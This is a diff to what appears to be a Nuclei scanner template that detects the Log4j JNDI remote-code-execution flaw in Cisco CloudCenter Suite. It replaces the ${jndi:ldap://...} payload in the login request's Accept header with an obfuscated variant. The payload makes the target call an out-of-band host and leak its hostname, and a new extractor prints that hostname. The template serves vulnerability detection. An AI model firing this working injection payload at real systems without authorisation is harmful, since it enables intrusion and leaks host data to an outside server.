@@ -21,13 +21,17 @@ info:
     shodan-query: title:"CloudCenter Suite"
   tags: cve,cve2021,jndi,log4j,rce,oast,cloudcenter,cisco,kev
 
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
 http:
   - raw:
       - |
         @timeout: 10s
         POST /suite-auth/login HTTP/1.1
         Host: {{Hostname}}
-        Accept: application/json, text/plain, */${jndi:ldap://${sys:os.name}.{{interactsh-url}}}
+        Accept: application/json, text/plain, */${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.uri.{{interactsh-url}}}
         Content-Type: application/json
 
         {"username":"{{randstr}}@{{randstr}}.com","password":"{{randstr}}","tenantName":"{{randstr}}"}
@@ -42,7 +46,7 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
       - type: word
         part: header
@@ -54,10 +58,11 @@ http:
         kval:
           - interactsh_ip # Print remote interaction IP in output
 
+    extractors:
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
 # Enhanced by md on 2023/03/22
